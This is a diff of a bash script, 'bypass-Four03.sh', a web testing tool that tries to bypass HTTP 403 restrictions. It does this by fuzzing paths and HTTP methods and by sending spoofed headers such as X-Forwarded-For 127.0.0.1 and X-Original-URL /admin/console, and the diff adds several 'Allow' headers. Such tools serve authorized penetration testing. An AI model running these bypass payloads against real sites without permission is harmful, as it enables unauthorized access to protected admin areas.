@@ -11,6 +11,8 @@ VIOLET='\033[38;2;138;43;226m'
 ORANGE='\033[38;2;255;165;0m'
 INDIGO='\033[38;2;75;0;130m'
 
+
+
 # Help menu
 if [[ "$1" == "--help" || "$1" == "-h" ]]; then
     echo -e "${ORANGE}Usage: ./bypass-Four03.sh [URL] [path]"
@@ -23,12 +25,16 @@ if [[ "$1" == "--help" || "$1" == "-h" ]]; then
     exit 0
 fi
 
+
+
 echo -e "${ORANGE}"
 figlet -f slant Bypass-Four03
 echo -e "${ORANGE}"
 echo "                                           				    By nazmul__ethi"
 echo "./bypass-Four03.sh $1 $2"
 echo " "
+
+
 
 # Function to colorize HTTP status codes
 colorize_status_code() {
@@ -51,6 +57,8 @@ colorize_status_code() {
     fi
 }
 
+
+
 # Path Fuzzing
 echo -e "${VIOLET}PATH FUZZING${RESET}"
 echo ""
@@ -63,29 +71,31 @@ for path in "${fuzz_paths[@]}"; do
     echo -e "  --> ${path}  Response: [${colorized_code}] Size: ${size}"
 done
 
+
+
 # Header Fuzzing
 echo ""
 echo -e "${VIOLET}HEADER FUZZING${RESET}"
 echo ""
 fuzz_headers=(
-    "-H 'X-Original-URL: $2'"
-    "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
-    "-H 'X-Originating-IP: 127.0.0.1'"
-    "-H 'X-Forwarded: 127.0.0.1'"
-    "-H 'X-Remote-IP: 127.0.0.1'"
-    "-H 'X-Remote-Addr: 127.0.0.1'"
-    "-H 'X-ProxyUser-Ip: 127.0.0.1'"
-    "-H 'X-Forwarded-For: 127.0.0.1'"
-    "-H 'X-Forwarded-For: 127.0.0.1:80'"
-    "-H 'X-Custom-IP-Authorization: 127.0.0.1:80'"
-    "-H 'X-Originating-IP: 127.0.0.1:80'"
-    "-H 'X-Remote-IP: 127.0.0.1:80'"
-    "-H 'X-Remote-Addr: 127.0.0.1:80'"
-    "-H 'X-rewrite-url: $2'"
-    "-H 'Host: localhost'"
-    "-H 'X-Host: 127.0.0.1'"
-    "-H 'X-Forwarded-Host: 127.0.0.1'"
-    "-H 'Content-Length: 0' -X POST"
+	"-H 'X-Original-URL: $2'"
+	"-H 'X-Custom-IP-Authorization: 127.0.0.1'"
+	"-H 'X-Originating-IP: 127.0.0.1'"
+	"-H 'X-Forwarded: 127.0.0.1'"
+	"-H 'X-Remote-IP: 127.0.0.1'"
+	"-H 'X-Remote-Addr: 127.0.0.1'"
+	"-H 'X-ProxyUser-Ip: 127.0.0.1'"
+	"-H 'X-Forwarded-For: 127.0.0.1'"
+	"-H 'X-Forwarded-For: 127.0.0.1:80'"
+	"-H 'X-Custom-IP-Authorization: 127.0.0.1:80'"
+	"-H 'X-Originating-IP: 127.0.0.1:80'"
+	"-H 'X-Remote-IP: 127.0.0.1:80'"
+	"-H 'X-Remote-Addr: 127.0.0.1:80'"
+	"-H 'X-rewrite-url: $2'"
+	"-H 'Host: localhost'"
+	"-H 'X-Host: 127.0.0.1'"
+	"-H 'X-Forwarded-Host: 127.0.0.1'"
+	"-H 'Content-Length: 0' -X POST"
 	"-H 'X-Original-URL: /admin/console'"
 	"-H 'X-Rewrite-URL: /admin/console'"
 	"-H 'X-Original-URL: /admin/'"
@@ -106,6 +116,11 @@ fuzz_headers=(
 	"-H 'X-Forwarded-Port: 8080'"
 	"-H 'X-Forwarded-Port: 8443'"
 	"-H 'X-Forwarded-Port: 8443'"
+	"-H 'Allow: GET'"
+	"-H 'Allow: HEAD'"
+	"-H 'Allow: POST'"
+	"-H 'Allow: TRACE'"
+	"-H 'Allow: CONNECT'"
 )
 
 for header in "${fuzz_headers[@]}"; do
@@ -115,6 +130,8 @@ for header in "${fuzz_headers[@]}"; do
     colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
     echo -e "  --> ${1}/${2} ${header} Response: [${colorized_code}] Size: ${size}"
 done
+
+
 
 # HTTP Method Fuzzing
 echo ""
@@ -129,6 +146,8 @@ for method in "${methods[@]}"; do
     echo -e "  --> ${1}/${2} -X $method Response: [${colorized_code}] Size: ${size}"
 done
 
+
+
 # HTTP Protocol Version Fuzzing
 echo ""
 echo -e "${VIOLET}HTTP PROTOCOL VERSION FUZZING${RESET}"
@@ -141,6 +160,8 @@ for version in "${versions[@]}"; do
     colorized_code=$(colorize_status_code "$http_code")  # Colorize the status code
     echo -e "  --> ${1}/${2} with HTTP/$version Response: [${colorized_code}] Size: ${size}"
 done
+
+
 
 # Wayback Machine Check
 echo ""
